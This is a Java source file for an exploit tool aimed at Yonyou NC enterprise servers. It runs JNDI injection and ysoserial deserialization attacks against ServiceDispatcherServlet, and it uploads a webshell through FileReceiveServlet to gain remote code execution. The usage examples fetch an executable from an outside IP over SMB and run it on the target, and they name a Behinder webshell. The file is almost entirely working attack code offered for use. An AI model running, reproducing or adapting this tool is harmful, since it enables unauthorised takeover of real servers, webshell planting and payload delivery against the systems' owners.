package com.example;
import com.example.utils.HttpUtils;
import com.example.utils.Serializables;
import io.netty.handler.codec.http.DefaultHttpHeaders;
import io.netty.handler.codec.http.HttpHeaders;
import nc.bs.framework.common.NCLocator;
import nc.bs.framework.comn.NetObjectOutputStream;
import org.apache.commons.cli.*;
import org.apache.commons.lang.ArrayUtils;
import org.asynchttpclient.Response;
import ysoserial.payloads.ObjectPayload;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;
import java.util.Properties;

/**
 * 该类实现指定形式的用友NC RCE攻击
 */
public class NCExploit {

    private void printUsage(Options options) {
        HelpFormatter formatter = new HelpFormatter();
        formatter.printHelp("Options", options);
        System.out.println("Example: ");
        System.out.println("JNDI注入Getshell：");
        System.out.println("\t\t-t http://1.1.1.1/ -m jndi -j ldap://2.2.2.2/Exp\n");
        System.out.println("用友NC ServiceDispatcherServlet反序列化漏洞RCE：");
        System.out.println("\t\t-t http://1.1.1.1/ -m serial -g CommonsCollections1 -c \"ping -n 1 www.qq.com\"");
        System.out.println("用友NC FileReceiveServlet任意文件上传漏洞利用：");
        System.out.println("\t\t-t http://1.1.1.1/ -m upload -s shell.jsp");
        System.out.println("利用示例：");
        System.out.println("java -jar yongyouNC-Exp.jar -t http://192.168.127.55:8080/ -m serial -g CommonsCollections1 -c \"cmd.exe /c replace.exe \\\\106.13.22.69\\TMP\\exp.exe %tmp% /A\"");
        System.out.println("java -jar yongyouNC-Exp.jar -t http://192.168.127.55:8080/ -m serial -g CommonsCollections1 -c \"cmd.exe /c %tmp%\\exp.exe\"");
        System.out.println("java -jar yongyouNC-Exp.jar -t http://127.0.0.1:9090/ -m upload -s D:\\hacktools\\Behinder\\server\\shell.jsp");
    }

    private void attackJndi(String url, String jndipath) {
        Properties env = new Properties();
        env.put("SERVICEDISPATCH_URL", url + "/ServiceDispatcherServlet");
        NCLocator locator = NCLocator.getInstance(env);
        locator.lookup(jndipath);
    }

    private void attackUnserial(String url, String gadget, String cmd)  {
        url = url + "/ServiceDispatcherServlet/xxxx";
        try {
            ObjectPayload<?> payload = (ObjectPayload) Class.forName("ysoserial.payloads." + gadget).newInstance();
            Object obj = payload.getObject(cmd);

            ByteArrayOutputStream bos = new ByteArrayOutputStream();

            ByteArrayOutputStream temp = NetObjectOutputStream.convertObjectToBytes(obj, true, true);

            NetObjectOutputStream.writeInt(bos, temp.toByteArray().length);

            temp.writeTo(bos);

            HttpHeaders headers = new DefaultHttpHeaders();
            headers.add("Content-Type", "application/x-java-serialized-object");

            HttpUtils httpUtils = new HttpUtils();
            httpUtils.post(url, bos.toByteArray(), headers);
        } catch (ClassNotFoundException e) {
            System.out.println("[-] Ysoserial Payload Not Found: " + gadget);
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }

        System.exit(0);

    }

    /**
     * tools帖子，任意文件上传
     * https://www.t00ls.net/thread-58781-1-1.html
     * @param url  目标URL
     * @param shellPath  shell的地址
     */
    private void attackUploadShell(String url, String shellPath) throws Exception {
        Map<String, Object> metaInfo = null;
        metaInfo = new HashMap<>();
        metaInfo.put("TARGET_FILE_PATH", "./webapps/nc_web");
        metaInfo.put("FILE_NAME", "css.jsp");
        byte[] objBytes = Serializables.serialize(metaInfo);
        byte[] shellBytes = Files.readAllBytes(Paths.get(shellPath));

        HttpHeaders headers = new DefaultHttpHeaders();
        headers.add("Content-Type", "multipart/form-data;");

        HttpUtils httpUtils = new HttpUtils();

        Response response1 = httpUtils.post(url + "/servlet/FileReceiveServlet", ArrayUtils.addAll(objBytes, shellBytes), headers);
        System.out.println("Receive Data:");
        System.out.println(response1.getResponseBody());
        Response response2 = httpUtils.get(url + "/css.jsp", null);

        if (response1.getStatusCode() == 200 && response2.getStatusCode() != 404) {
            System.out.println("[+] 成功获取WebShell: " + url + "/css.jsp");
            System.exit(0);
        }

    }

    public static void main(String[] args) {
        NCExploit ncExploit = new NCExploit();

        Options options = new Options();
        options.addOption("h", "help", true,"Usage of this tool");

        // -t http://1.1.1.1/ -m jndi -j ldap://2.2.2.2/Exp
        // -t http://1.1.1.1/ -m serial -g CommonsCollections1 -c "ping -n 1 www.qq.com"
        options.addOption("t", "target", true, "Exploit target");
        options.addOption("m", "Exploit Method",true,"How to RCE the target, value: jndi/serial");
        options.addOption("j", "jndiUrl", true, "JNDI Server URL");
        options.addOption("g", "gadget", true, "Ysoserial Gadgets");
        options.addOption("c", "cmd", true, "Command you wanna execute remotely");
        options.addOption("s", "shell_path", true, "the path of shell you wanna upload");

        CommandLineParser parser = new BasicParser();

        try {
            CommandLine cli = parser.parse(options, args);

            if (cli.hasOption("h")) {
                ncExploit.printUsage(options);
            } else {
                String target = cli.getOptionValue("t");
                String method = cli.getOptionValue("m");
                String jndiUrl = cli.getOptionValue("j");
                String gadget = cli.getOptionValue("g");
                String cmd = cli.getOptionValue("c");
                String shellPath = cli.getOptionValue("s");

                if (method == null || target == null) {
                    ncExploit.printUsage(options);
                    System.exit(-1);
                }

                // JNDI注入触发
                if (method.equals("jndi")) {
                    ncExploit.attackJndi(target, jndiUrl);
                }

                //直接反序列化触发
                if (method.equals("serial")) {
                    System.out.println("Select gadget: " + gadget);
                    System.out.println("Command gonna run: " + cmd);
                    if (cmd == null || gadget == null) {
                        ncExploit.printUsage(options);
                        System.exit(-1);
                    }
                    ncExploit.attackUnserial(target, gadget, cmd);
                }

                //任意文件写入漏洞
                if (method.equals("upload")) {
                    ncExploit.attackUploadShell(target, shellPath);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

















